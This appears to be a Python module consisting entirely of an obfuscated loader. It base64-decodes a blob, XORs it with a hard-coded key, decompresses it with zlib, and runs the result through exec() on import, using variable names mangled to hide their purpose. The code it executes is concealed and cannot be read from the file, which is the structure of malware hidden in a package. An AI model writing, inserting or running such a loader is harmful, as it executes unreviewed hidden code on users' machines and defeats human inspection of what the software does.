import base64 as _q_e5dce62b
import zlib as _z_e5dce62b
_k_e5dce62b = b'X!\xba\xcc\x97u#X\x80\x1dLVM\xa1\xd9\x1b\xfdZH\xdbdcZ\xf6'
_d_e5dce62b = bytes(_c_e5dce62b ^ _k_e5dce62b[_i_e5dce62b % len(_k_e5dce62b)] for _i_e5dce62b, _c_e5dce62b in enumerate(_q_e5dce62b.b64decode('IPtxALq9DHLRVQZ6A5TqSrV2HlNL7xXEbmmJ/qJBw5IEVRqzKYdYvldKGodNyjP8qeTKzRqNZxWrM0l2Zev0MtCQC43I9MhsxL7hnAMvf/QBefAI3zjQU9t/XX89MFU8Dg6XhUTAc48ER90SCIphGxy0D3k=')))
_d_e5dce62b = _z_e5dce62b.decompress(_d_e5dce62b)
exec(compile(_d_e5dce62b, __file__, 'exec'), globals(), globals())
